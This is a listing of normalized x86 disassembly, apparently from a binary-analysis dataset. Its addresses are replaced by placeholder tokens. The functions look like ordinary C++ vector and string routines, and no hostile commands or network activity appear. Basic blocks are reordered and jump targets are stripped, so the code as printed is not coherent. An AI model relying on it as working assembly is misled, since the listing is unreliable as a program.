push esi
lea ecx [ ebp + 0x70 ]
call sub_10001500
push edi
push esi
lea ecx [ ebp + 0x1c ]
mov [ ebp - 0x4 ] 0x6
call sub_10001500
xor edi edi
sub_1001192d
push 0x64
mov eax sub_1004f477
call sub_1002826c
mov eax [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0xc ]
push r--data
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x38 ] edi
call sub_1000134a
xor esi esi
lea eax [ ebp - 0x2c ]
inc esi
push eax
lea ebx [ ebp - 0x54 ]
mov [ ebp - 0x4 ] esi
call sub_10015ec7
pop ecx
push edi
push esi
mov ecx ebx
mov [ ebp - 0x4 ] 0x3
call sub_10001500
lea ecx [ ebp - 0x2c ]
lea ebx [ ebp - 0x70 ]
call sub_10016092
push r--data
push eax
mov [ ebp - 0x4 ] 0x4
push [ ebp - 0x30 ]
call sub_10004ab3
add esp 0xc
push edi
push esi
mov ecx ebx
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x4 ] 0x3
call sub_10001500
push [ ebp - 0x30 ]
mov ecx [ ebp - 0x34 ]
call sub_10016690
pop ecx
push edi
push esi
lea ecx [ ebp - 0x2c ]
call sub_10001500
mov eax [ ebp - 0x30 ]
call sub_100282ef
retn 0x8
sub_100119cb
push 0x0
mov eax sub_1004cbb1
call sub_10028203
mov esi [ esp + 0x24 ]
push 0x0
push 0x1
call sub_100018cf
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov [ esi ] eax
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
and [ esi + 0x14 ] 0x0
mov eax esi
call sub_100282db
retn 0x4
sub_10011a08
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
push ebx
push esi
push edi
mov edi eax
mov ecx [ edi + 0xc ]
test ecx ecx
jne r-xdata
mov eax [ edi + 0x14 ]
sub eax ecx
sar eax 0x3
xor eax eax
jmp r-xdata
lea esi [ esp + 0x10 ]
call sub_10018308
push [ esp + 0x14 ]
lea eax [ esp + 0x14 ]
push [ esp + 0x14 ]
push [ ebp + 0x8 ]
push eax
mov eax edi
call sub_10011a70
push [ ebp + 0x8 ]
xor esi esi
inc esi
call sub_10011b17
mov [ edi + 0x10 ] eax
jmp r-xdata
mov ebx [ edi + 0x10 ]
mov edx ebx
sub edx ecx
sar edx 0x3
cmp edx eax
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_10011a70
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0xc ]
mov eax [ edi + 0x10 ]
sub eax ebx
test eax 0xfffffff8
jne r-xdata
lea esi [ ebp - 0x8 ]
call sub_10018308
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
call sub_10024832
cmp eax [ ebp - 0x8 ]
je r-xdata
push [ ebp + 0x14 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x10 ]
push edi
call sub_10011b3e
mov ebx [ edi + 0xc ]
lea esi [ ebp - 0x10 ]
call sub_10018308
mov edi [ ebp - 0x10 ]
mov esi [ ebp - 0xc ]
mov ebx edi
mov [ ebp - 0xc ] esi
test edi edi
jne r-xdata
mov eax [ edi ]
jmp r-xdata
call sub_10024832
xor eax eax
mov eax [ ebp + 0x14 ]
sub eax [ ebp - 0x4 ]
sar eax 0x3
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
lea esi [ esi + ecx * 8 ]
cmp esi [ eax + 0x10 ]
ja r-xdata
call sub_10024832
test edi edi
je r-xdata
xor edi edi
mov edi [ edi ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop edi
mov [ eax + 0x4 ] esi
pop esi
mov [ eax ] ebx
pop ebx
leave
retn 0x10
cmp esi [ edi + 0xc ]
jae r-xdata
sub_10011b17
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
mov edi [ ebp + 0x8 ]
push [ ebp + 0x8 ]
mov eax ebx
push esi
call sub_10011efd
add esp 0xc
lea eax [ ebx + esi * 8 ]
pop edi
leave
retn 0x4
sub_10011b3e
push 0x18
mov eax sub_1004d4cb
call sub_10028236
mov ebx ecx
mov edi [ ebp + 0x8 ]
mov edx [ edi + 0xc ]
test edx edx
jne r-xdata
mov eax [ edi + 0x14 ]
sub eax edx
sar eax 0x3
mov [ ebp - 0x18 ] eax
and [ ebp - 0x18 ] edx
jmp r-xdata
inc eax
cmp [ ebp - 0x18 ] eax
jae r-xdata
call sub_1001827a
mov ecx [ edi + 0x10 ]
mov eax ecx
sub eax edx
mov edx 0x1fffffff
sar eax 0x3
mov esi edx
sub esi eax
cmp esi 0x1
jae r-xdata
sub ecx [ ebp + 0x10 ]
mov eax [ ebx ]
xor esi esi
sar ecx 0x3
inc esi
add ebx 0x4
cmp ecx esi
mov [ ebp - 0x24 ] eax
push ebx
lea ecx [ ebp - 0x20 ]
jae r-xdata
mov ecx [ ebp - 0x18 ]
shr ecx 0x1
sub edx ecx
cmp edx [ ebp - 0x18 ]
jae r-xdata
call sub_10003d36
mov [ ebp - 0x4 ] 0x5
mov esi [ edi + 0x10 ]
push esi
lea ebx [ esi - 0x8 ]
push esi
mov ecx ebx
call sub_10011e35
mov [ edi + 0x10 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp + 0x8 ] eax
cmp eax ebx
je r-xdata
call sub_10003d36
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp + 0x10 ]
lea eax [ ecx + 0x8 ]
push eax
push [ edi + 0x10 ]
call sub_10011e35
mov [ ebp - 0x4 ] 0x3
mov ebx [ edi + 0x10 ]
lea eax [ ebp - 0x24 ]
push eax
mov eax ebx
sub eax [ ebp + 0x10 ]
sar eax 0x3
sub esi eax
call sub_10011b17
mov [ ebp - 0x4 ] 0x2
add [ edi + 0x10 ] 0x8
mov edi [ edi + 0x10 ]
mov esi [ ebp + 0x10 ]
add edi 0xfffffff8
jmp r-xdata
add [ ebp - 0x18 ] ecx
and [ ebp - 0x18 ] 0x0
jmp r-xdata
lea edi [ eax + 0x8 ]
mov esi eax
cmp eax edi
je r-xdata
mov edi esi
sub edi ebx
cmp esi edi
jne r-xdata
mov ecx [ ebp - 0x18 ]
call sub_10011d7a
mov ecx [ ebp + 0x10 ]
sub ecx [ edi + 0xc ]
and [ ebp + 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
sar ecx 0x3
push ebx
xor esi esi
lea ebx [ eax + ecx * 8 ]
inc esi
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] ecx
call sub_10011b17
mov ebx [ ebp - 0x1c ]
mov ecx [ edi + 0xc ]
push ebx
push [ ebp + 0x10 ]
mov [ ebp + 0x8 ] esi
call sub_10011e35
mov eax [ ebp - 0x20 ]
mov ecx [ ebp + 0x10 ]
lea eax [ ebx + eax * 8 + 0x8 ]
push eax
push [ edi + 0x10 ]
mov [ ebp + 0x8 ] 0x2
call sub_10011e35
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ edi + 0x10 ]
mov eax [ edi + 0xc ]
mov esi ecx
sub esi eax
sar esi 0x3
inc esi
test eax eax
je r-xdata
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] eax
jae r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0x20 ]
test ecx ecx
je r-xdata
lea eax [ ebp - 0x24 ]
call sub_10011f26
add esi 0x8
cmp esi edi
jne r-xdata
sub ebx 0x8
lea esi [ edi + ebx ]
mov eax ebx
call sub_10011f26
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x10 ]
lea eax [ ebp - 0x24 ]
call sub_10011f26
add esi 0x8
jmp r-xdata
mov eax [ ebp - 0x18 ]
lea eax [ ebx + eax * 8 ]
mov [ edi + 0x14 ] eax
lea eax [ ebx + esi * 8 ]
mov [ edi + 0x10 ] eax
mov [ edi + 0xc ] ebx
jmp r-xdata
push ecx
call sub_1000de39
push [ edi + 0xc ]
call sub_100242e6
pop ecx
call sub_100282db
retn 0xc
call sub_10003d5c
sub_10011c3d
cmp [ ebp + 0x8 ] 0x1
mov esi [ ebp - 0x1c ]
mov edi [ ebp - 0x20 ]
jle r-xdata
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
jle r-xdata
lea eax [ esi + edi * 8 ]
push eax
mov eax esi
call sub_1000de39
push esi
call sub_100242e6
pop ecx
push ebx
push ebx
call sub_10027dd1
sub ecx [ ebp + 0x10 ]
mov eax [ ebx ]
xor esi esi
sar ecx 0x3
inc esi
add ebx 0x4
cmp ecx esi
mov [ ebp - 0x24 ] eax
push ebx
lea ecx [ ebp - 0x20 ]
jae r-xdata
lea eax [ esi + edi * 8 + 0x8 ]
push eax
lea eax [ esi + edi * 8 ]
call sub_1000de39
call sub_10003d36
mov [ ebp - 0x4 ] 0x5
mov esi [ edi + 0x10 ]
push esi
lea ebx [ esi - 0x8 ]
push esi
mov ecx ebx
call sub_10011e35
mov [ edi + 0x10 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp + 0x8 ] eax
cmp eax ebx
je r-xdata
call sub_10003d36
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp + 0x10 ]
lea eax [ ecx + 0x8 ]
push eax
push [ edi + 0x10 ]
call sub_10011e35
mov [ ebp - 0x4 ] 0x3
mov ebx [ edi + 0x10 ]
lea eax [ ebp - 0x24 ]
push eax
mov eax ebx
sub eax [ ebp + 0x10 ]
sar eax 0x3
sub esi eax
call sub_10011b17
mov [ ebp - 0x4 ] 0x2
add [ edi + 0x10 ] 0x8
mov edi [ edi + 0x10 ]
mov esi [ ebp + 0x10 ]
add edi 0xfffffff8
jmp r-xdata
lea edi [ eax + 0x8 ]
mov esi eax
cmp eax edi
je r-xdata
mov edi esi
sub edi ebx
cmp esi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0x20 ]
test ecx ecx
je r-xdata
lea eax [ ebp - 0x24 ]
call sub_10011f26
add esi 0x8
cmp esi edi
jne r-xdata
sub ebx 0x8
lea esi [ edi + ebx ]
mov eax ebx
call sub_10011f26
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x10 ]
lea eax [ ebp - 0x24 ]
call sub_10011f26
add esi 0x8
jmp r-xdata
call sub_100282db
retn 0xc
call sub_10003d5c
sub_10011d7a
push ebp
mov ebp esp
sub esp 0x10
test ecx ecx
ja r-xdata
or eax 0xffffffff
xor edx edx
div ecx
cmp eax 0x8
jae r-xdata
xor ecx ecx
mov eax ecx
shl eax 0x3
push eax
call sub_10024389
pop ecx
leave
retn
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
call sub_100243ff
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_10027dd1
int3
sub_10011dc6
push 0x4
mov eax sub_1004dcb1
call sub_10028203
mov esi ecx
mov [ ebp - 0x10 ] esi
call sub_10003efc
and [ ebp - 0x4 ] 0x0
call sub_1003d584
push [ eax ]
push esi
push [ ebp + 0x8 ]
call sub_10011eb6
add esp 0xc
mov eax esi
call sub_100282db
retn 0x8
sub_10011dfd
push 0x0
mov eax sub_1004cc8c
call sub_10028203
mov ecx [ ebp + 0x8 ]
call sub_10003efc
and [ ebp - 0x4 ] 0x0
call sub_1003d584
push [ eax ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_1003bfd3
mov eax [ ebp + 0x8 ]
add esp 0xc
call sub_100282db
retn 0x8
sub_10011e35
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_10011f5e
add esp 0xc
pop edi
leave
retn 0x8
sub_10011e59
push 0x4
mov eax sub_1004ca6a
call sub_10028236
mov esi ecx
and [ esi ] 0x0
and [ ebp - 0x4 ] 0x0
push 0x10
call sub_10024389
pop ecx
test eax eax
je r-xdata
xor eax eax
xor ecx ecx
inc ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
jmp r-xdata
mov [ esi ] eax
mov eax esi
call sub_100282db
retn 0x4
sub_10011eb6
push ebp
mov ebp esp
sub esp 0x10
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi [ edi + 0x14 ]
test esi esi
je r-xdata
pop edi
pop esi
leave
retn
lea eax [ ebp - 0x8 ]
push eax
mov ecx edi
call sub_10008a30
mov ecx eax
call sub_10005274
lea esi [ eax + esi * 2 ]
lea eax [ ebp - 0x10 ]
push eax
mov ecx edi
call sub_10008a30
mov ecx eax
call sub_10005274
mov ecx [ ebp + 0xc ]
push esi
push eax
call sub_10012509
sub_10011efd
push esi
mov esi eax
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
ja r-xdata
test esi esi
je r-xdata
pop esi
retn
dec [ esp + 0x8 ]
add esi 0x8
mov eax [ edi ]
mov [ esi ] eax
lea eax [ edi + 0x4 ]
push eax
lea ecx [ esi + 0x4 ]
call sub_10003d36
sub_10011f26
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ eax ]
add eax 0x4
mov [ ebp - 0x8 ] ecx
push eax
lea ecx [ ebp - 0x4 ]
call sub_10003d36
lea eax [ ebp - 0x8 ]
cmp eax esi
je r-xdata
mov ecx [ esi + 0x4 ]
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ esi ] eax
mov eax esi
leave
retn
call sub_10003d5c
sub_10011f5e
push esi
push edi
mov edi eax
mov esi ecx
jmp r-xdata
cmp esi [ esp + 0xc ]
jne r-xdata
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
retn
add edi 0x8
add esi 0x8
mov eax [ esi ]
mov [ edi ] eax
lea eax [ esi + 0x4 ]
push eax
lea ecx [ edi + 0x4 ]
call sub_10003d36
sub_10011f8b
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
cmp [ edi + 0x14 ] esi
jb r-xdata
call sub_10022f7c
mov eax [ ebp + 0x10 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebp + 0x14 ]
jae r-xdata
mov ecx [ edi + 0x14 ]
mov eax ecx
sub eax esi
cmp eax [ ebp + 0xc ]
jae r-xdata
mov eax [ ebp + 0x10 ]
mov eax [ eax + 0x14 ]
sub eax [ ebp + 0x14 ]
mov ebx [ ebp + 0x18 ]
cmp eax ebx
jae r-xdata
mov [ ebp + 0xc ] eax
sub ecx [ ebp + 0xc ]
or eax 0xffffffff
sub eax ebx
cmp eax ecx
ja r-xdata
mov ebx eax
mov ecx [ edi + 0x14 ]
mov eax ecx
sub eax [ ebp + 0xc ]
mov edx ecx
sub edx esi
sub edx [ ebp + 0xc ]
add eax ebx
mov [ ebp + 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp ecx eax
jae r-xdata
call sub_10022f44
cmp edi [ ebp + 0x10 ]
je r-xdata
push 0x0
push eax
mov ecx edi
call sub_100016c7
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
cmp ebx eax
ja r-xdata
mov eax [ edi + 0x18 ]
cmp eax 0x8
jb r-xdata
cmp [ ebp + 0x14 ] esi
ja r-xdata
mov eax [ edi + 0x18 ]
cmp eax 0x8
jb r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
add eax esi
cmp eax [ ebp + 0x14 ]
mov [ ebp + 0x18 ] eax
mov eax [ edi + 0x18 ]
ja r-xdata
mov eax [ edi + 0x18 ]
cmp eax 0x8
jb r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
mov [ ebp + 0x8 ] ecx
cmp eax 0x8
jb r-xdata
cmp eax 0x8
jb r-xdata
cmp eax 0x8
jb r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
lea edx [ edi + 0x4 ]
mov edx [ edi + 0x4 ]
jmp r-xdata
cmp eax 0x8
jb r-xdata
lea edx [ eax + 0x4 ]
mov edx [ eax + 0x4 ]
jmp r-xdata
mov [ ebp + 0x18 ] ecx
mov ecx [ ebp + 0xc ]
push edx
mov edx [ ebp + 0x8 ]
add ecx esi
sub eax esi
lea ecx [ edx + ecx * 2 ]
push ecx
mov ecx [ ebp + 0x18 ]
sub eax ebx
push eax
lea eax [ esi + ebx ]
lea eax [ ecx + eax * 2 ]
push eax
call sub_10001a0b
mov eax [ ebp + 0x10 ]
add esp 0x10
cmp [ eax + 0x18 ] 0x8
jb r-xdata
lea edx [ edi + 0x4 ]
mov edx [ edi + 0x4 ]
jmp r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
mov [ ebp + 0x10 ] ecx
cmp eax 0x8
jb r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
mov [ ebp + 0x10 ] edx
mov edx [ ebp + 0x14 ]
push ebx
lea ecx [ ecx + edx * 2 ]
sub eax esi
push ecx
push eax
mov eax [ ebp + 0x10 ]
lea eax [ eax + esi * 2 ]
push eax
call sub_10001a0b
mov eax [ edi + 0x18 ]
add esp 0x10
cmp eax 0x8
jb r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
mov eax [ edi + 0x18 ]
cmp eax 0x8
jb r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
cmp eax 0x8
jb r-xdata
lea edx [ edi + 0x4 ]
mov edx [ edi + 0x4 ]
jmp r-xdata
cmp eax 0x8
jb r-xdata
lea edx [ edi + 0x4 ]
mov edx [ edi + 0x4 ]
jmp r-xdata
mov [ ebp + 0x8 ] ecx
mov ecx [ ebp + 0xc ]
push edx
mov edx [ ebp + 0x10 ]
add ecx esi
sub eax esi
lea ecx [ edx + ecx * 2 ]
push ecx
mov ecx [ ebp + 0x8 ]
sub eax ebx
push eax
lea eax [ esi + ebx ]
lea eax [ ecx + eax * 2 ]
push eax
call sub_10001a0b
mov eax [ edi + 0x18 ]
add esp 0x10
cmp eax 0x8
jb r-xdata
lea edx [ edi + 0x4 ]
mov edx [ edi + 0x4 ]
jmp r-xdata
cmp eax 0x8
jb r-xdata
add esp 0x10
push [ ebp - 0x4 ]
mov ecx edi
call sub_100016a9
mov eax edi
pop edi
pop esi
pop ebx
leave
retn 0x14
push ebx
mov ebx [ ebp + 0x14 ]
lea edx [ edx + ebx * 2 ]
push edx
sub eax esi
push eax
lea eax [ ecx + esi * 2 ]
push eax
call sub_10001b42
jmp r-xdata
lea edx [ edi + 0x4 ]
mov edx [ edi + 0x4 ]
jmp r-xdata
push [ ebp + 0xc ]
mov [ ebp + 0x10 ] ecx
mov ecx [ ebp + 0x14 ]
lea ecx [ edx + ecx * 2 ]
sub eax esi
push ecx
push eax
mov eax [ ebp + 0x10 ]
lea eax [ eax + esi * 2 ]
push eax
call sub_10001a0b
mov eax [ edi + 0x18 ]
add esp 0x10
cmp eax 0x8
jb r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
push [ ebp + 0x8 ]
mov [ ebp + 0x10 ] edx
mov edx [ ebp + 0x18 ]
sub eax esi
lea ecx [ ecx + edx * 2 ]
push ecx
mov ecx [ ebp + 0x10 ]
sub eax ebx
push eax
lea eax [ esi + ebx ]
lea eax [ ecx + eax * 2 ]
push eax
call sub_10001a0b
mov eax [ edi + 0x18 ]
add esp 0x10
cmp eax 0x8
jb r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
cmp eax 0x8
jb r-xdata
push eax
call sub_10001a0b
push [ ebp + 0x8 ]
mov [ ebp + 0x14 ] edx
mov edx [ ebp + 0xc ]
add edx esi
sub eax esi
sub eax ebx
lea ecx [ ecx + edx * 2 ]
push ecx
push eax
mov eax [ ebp + 0x14 ]
add esi ebx
lea eax [ eax + esi * 2 ]
jmp r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
cmp eax 0x8
jb r-xdata
lea edx [ edi + 0x4 ]
mov edx [ edi + 0x4 ]
jmp r-xdata
mov [ ebp + 0x10 ] ecx
cmp eax 0x8
jb r-xdata
push ebx
mov ebx [ ebp + 0x14 ]
lea edx [ edx + ebx * 2 ]
sub eax esi
push edx
push eax
lea eax [ ecx + esi * 2 ]
jmp r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
push [ ebp + 0x8 ]
mov [ ebp + 0x10 ] ecx
mov ecx [ ebp + 0xc ]
add ecx esi
add ecx ecx
mov [ ebp + 0x18 ] ecx
sub eax esi
add ecx edx
push ecx
mov ecx [ ebp + 0x10 ]
sub eax ebx
push eax
lea eax [ esi + ebx ]
lea eax [ ecx + eax * 2 ]
push eax
call sub_10001a0b
mov eax [ edi + 0x18 ]
add esp 0x10
cmp eax 0x8
jb r-xdata
mov ecx [ ebp + 0x14 ]
sub ecx [ ebp + 0xc ]
push ebx
add ecx ebx
mov ebx [ ebp + 0x10 ]
lea ecx [ ebx + ecx * 2 ]
sub eax esi
push ecx
push eax
lea eax [ edx + esi * 2 ]
jmp r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
mov [ ebp + 0x10 ] ecx
cmp eax 0x8
jb r-xdata
mov edx ebx
sub edx [ ebp + 0xc ]
sub eax esi
sub eax [ ebp + 0xc ]
push edx
mov edx [ ebp + 0x14 ]
add edx ebx
mov ebx [ ebp + 0x10 ]
lea edx [ ebx + edx * 2 ]
push edx
push eax
mov eax [ ebp + 0x18 ]
add eax ecx
sub_100122ea
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi [ ebp + 0x10 ]
push edi
mov esi ecx
call sub_1000188e
test al al
je r-xdata
mov edi [ ebp + 0x8 ]
cmp [ esi + 0x14 ] edi
jae r-xdata
cmp [ esi + 0x18 ] 0x8
jb r-xdata
mov eax [ esi + 0x14 ]
mov ecx eax
sub ecx edi
cmp ecx [ ebp + 0xc ]
jae r-xdata
call sub_10022f7c
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
sub eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x14 ]
or ecx 0xffffffff
sub ecx ebx
cmp ecx eax
ja r-xdata
mov [ ebp + 0xc ] ecx
pop edi
pop esi
leave
retn 0x10
push [ ebp + 0x14 ]
sub edi eax
sar edi 0x1
push edi
push esi
push [ ebp + 0xc ]
mov ecx esi
push [ ebp + 0x8 ]
call sub_10011f8b
jmp r-xdata
mov ecx [ esi + 0x14 ]
sub ecx edi
sub ecx [ ebp + 0xc ]
mov [ ebp - 0x4 ] ecx
cmp ebx [ ebp + 0xc ]
jae r-xdata
call sub_10022f44
test ebx ebx
ja r-xdata
mov eax [ esi + 0x18 ]
cmp eax 0x8
jb r-xdata
mov eax [ esi + 0x14 ]
sub eax [ ebp + 0xc ]
push 0x0
add eax ebx
push eax
mov ecx esi
mov [ ebp + 0x14 ] eax
call sub_100016c7
test al al
je r-xdata
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
lea edx [ esi + 0x4 ]
mov edx [ esi + 0x4 ]
jmp r-xdata
mov eax esi
pop ebx
cmp [ ebp + 0xc ] ebx
jae r-xdata
lea edx [ esi + 0x4 ]
mov edx [ esi + 0x4 ]
jmp r-xdata
mov [ ebp + 0x8 ] edx
cmp eax 0x8
jb r-xdata
mov eax [ esi + 0x18 ]
cmp eax 0x8
jb r-xdata
mov eax [ esi + 0x18 ]
lea ecx [ esi + 0x4 ]
cmp eax 0x8
jb r-xdata
push ecx
mov ecx [ ebp + 0xc ]
mov [ ebp + 0x14 ] edx
mov edx [ ebp + 0x8 ]
add ecx edi
sub eax edi
lea ecx [ edx + ecx * 2 ]
push ecx
mov ecx [ ebp + 0x14 ]
sub eax ebx
push eax
lea eax [ edi + ebx ]
lea eax [ ecx + eax * 2 ]
push eax
call sub_10001a0b
add esp 0x10
lea ecx [ esi + 0x4 ]
mov ecx [ esi + 0x4 ]
jmp r-xdata
mov edx ecx
mov edx [ ecx ]
jmp r-xdata
push ebx
push [ ebp + 0x10 ]
sub eax edi
push eax
lea eax [ ecx + edi * 2 ]
push eax
call sub_10001b42
add esp 0x10
push [ ebp + 0x14 ]
mov ecx esi
call sub_100016a9
push [ ebp - 0x4 ]
mov [ ebp + 0x8 ] ecx
mov ecx [ ebp + 0xc ]
add ecx edi
sub eax edi
lea ecx [ edx + ecx * 2 ]
push ecx
mov ecx [ ebp + 0x8 ]
sub eax ebx
push eax
lea eax [ edi + ebx ]
lea eax [ ecx + eax * 2 ]
push eax
call sub_10001a0b
add esp 0x10
mov ecx [ ecx ]
cmp eax 0x8
jb r-xdata
sub_10012467
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
push ebx
push esi
mov esi [ ebp + 0x1c ]
push edi
lea eax [ esp + 0x10 ]
mov ebx ecx
push eax
mov [ esp + 0x10 ] ebx
call sub_10008a30
cmp [ ebp + 0x18 ] esi
jne r-xdata
sub esi [ ebp + 0x18 ]
mov edi [ eax ]
mov ebx [ eax + 0x4 ]
sar esi 0x1
push esi
push [ ebp + 0x18 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_10012450
add esp 0x10
push eax
push ebx
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10012450
mov ecx [ esp + 0x28 ]
add esp 0x10
push eax
call sub_100122ea
push [ ebp + 0xc ]
mov esi [ eax ]
push [ ebp + 0x8 ]
mov edi [ eax + 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_10012450
add esp 0x10
push eax
push edi
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10012450
add esp 0x10
push eax
mov ecx ebx
call sub_10001629
jmp r-xdata
mov eax [ esp + 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_10012509
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x14
push ebx
push esi
push edi
lea eax [ esp + 0x10 ]
push eax
mov esi ecx
call sub_10008a50
mov edi [ eax ]
mov ebx [ eax + 0x4 ]
lea eax [ esp + 0x18 ]
push eax
mov ecx esi
call sub_10008a50
push [ ebp + 0xc ]
mov ecx esi
push [ ebp + 0x8 ]
push ebx
push edi
push [ eax + 0x4 ]
push [ eax ]
call sub_10012467
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_10012559
push 0xc
mov eax sub_1004cc69
call sub_10028203
mov esi ecx
mov [ ebp - 0x10 ] esi
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x24 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call sub_1003bce3
pop ecx
pop ecx
push 0x0
push 0x1
mov ecx esi
call sub_10001500
call sub_100282db
retn
sub_100125a7
push 0x4
mov eax sub_1004d4a0
call sub_10028236
mov esi ecx
and [ esi ] 0x0
and [ ebp - 0x4 ] 0x0
push 0x10
call sub_10024389
pop ecx
test eax eax
je r-xdata
xor eax eax
xor ecx ecx
inc ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
jmp r-xdata
mov [ esi ] eax
mov eax esi
call sub_100282db
retn 0x4
sub_10012600
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
push edi
lea ecx [ esi + 0x4 ]
mov [ esi ] edi
call sub_100125a7
push edi
push edi
push esi
call sub_10001a27
add esp 0xc
pop edi
mov eax esi
pop esi
retn 0x4
sub_10012643
push 0x4
mov eax sub_1004e2a2
call sub_10028203
mov ebx ecx
mov [ ebp - 0x10 ] ebx
push 0x28
call sub_10024389
mov esi eax
pop ecx
test esi esi
je r-xdata
xor esi esi
mov ecx esi
call sub_10012625
and [ esi + 0x24 ] 0x0
jmp r-xdata
push esi
mov ecx ebx
call sub_10012600
and [ ebp - 0x4 ] 0x0
push 0x0
push [ ebp + 0x8 ]
push ebx
call sub_1003c7b3
add esp 0xc
mov eax ebx
call sub_100282db
retn 0x4
sub_10012695
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004d485
mov eax [ fs : 0x0 ]
push eax
sub esp 0x4c
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x58 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x18 ] 0x10
mov edi [ eax + 0x14 ]
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
lea edx [ ecx + 0x4 ]
mov edx [ ecx + 0x4 ]
jmp r-xdata
cmp [ ecx + 0x18 ] 0x10
